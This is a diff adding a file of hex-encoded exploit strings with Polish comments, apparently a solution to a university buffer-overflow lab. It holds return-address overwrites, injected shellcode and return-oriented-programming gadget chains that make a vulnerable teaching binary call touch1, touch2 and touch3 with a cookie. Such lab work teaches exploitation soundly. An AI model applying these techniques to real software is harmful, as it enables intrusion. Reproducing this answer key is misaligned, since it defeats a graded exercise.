@@ -1,0 +1,92 @@
+/* rozmiar buforu = 56 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* wywolanie touch1 na adresie 0x4017fa */
+fa 17 40
+
+
+/* mov $0x4cf4b695, %rdi ; ret */
+48 c7 c7 95 b6 f4 4c c3
+/* Padding do 56 zgodnie z rozmiarem bufora */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* przeniesienie na adres 0x55618788 (pierwsza linijka buforu) */
+88 87 61 55 00 00 00 00
+/* wywolanie touch2 na adresie 0x401828 */
+28 18 40
+
+
+/* mov adres_bufora + 9*8, %rdi ; ret */
+48 c7 c7 D0 87 61 55 c3
+/* padding do 56 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* przeniesienie na adres 0x55618788 (pierwsza linijka buforu) */
+88 87 61 55 00 00 00 00
+/* wywolanie touch3 na adresie 0x401903 */
+03 19 40 00 00 00 00 00
+/* string cookie */
+34 63 66 34 62 36 39 35
+
+
+/* padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* gadget 1 - <setval_214> o adresie 4019aa + 2 => popq %rax  */
+ac 19 40 00 00 00 00 00 
+/* cookie */
+95 b6 f4 4c 00 00 00 00
+/* gadget 2 - <setval_339> o adresie 4019a3 + 2 => movq %rax %rdi */
+a5 19 40 00 00 00 00 00
+/* adres touch 2 */
+28 18 40 00 00 00 00 00
+
+
+/* padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* gadget - <setval_291> o adresie 401a01 + 2 => movq %rsp, %rax  */
+03 1a 40 00 00 00 00 00
+/* gadget - <setval_339> o adresie 4019a3 + 2 => movq %rax, %rdi  */
+a5 19 40 00 00 00 00 00
+/* gadget - <setval_214> o adresie 4019aa + 2 => popq %rax  */
+ac 19 40 00 00 00 00 00 
+/* przesuniecie o 48 - wykorzystany w wyliczeniu adresu stringa */
+48 00 00 00 00 00 00 00
+/* gadget - <getval_343> o adresie 401a3e + 2 => movl %eax to ecx */
+40 1a 40 00 00 00 00 00
+/* gadget - <setval_326> o adresie 4019de + 2 => movl %ecx to edx */
+e0 19 40 00 00 00 00 00
+/* gadget - <getval_337> o adresie 401a23 + 1 => movl %edx to esi */
+24 1a 40 00 00 00 00 00
+/* gadget - <add_xy> o adresie 4019d2 => "rdi + rsi = rax" */
+d2 19 40 00 00 00 00 00
+/* gadget - <setval_339> o adresie 4019a3 + 2 => movq %rax, %rdi  */
+a5 19 40 00 00 00 00 00
+/* adres touch 3 */
+03 19 40 00 00 00 00 00
+/* cookie string */
+34 63 66 34 62 36 39 35 
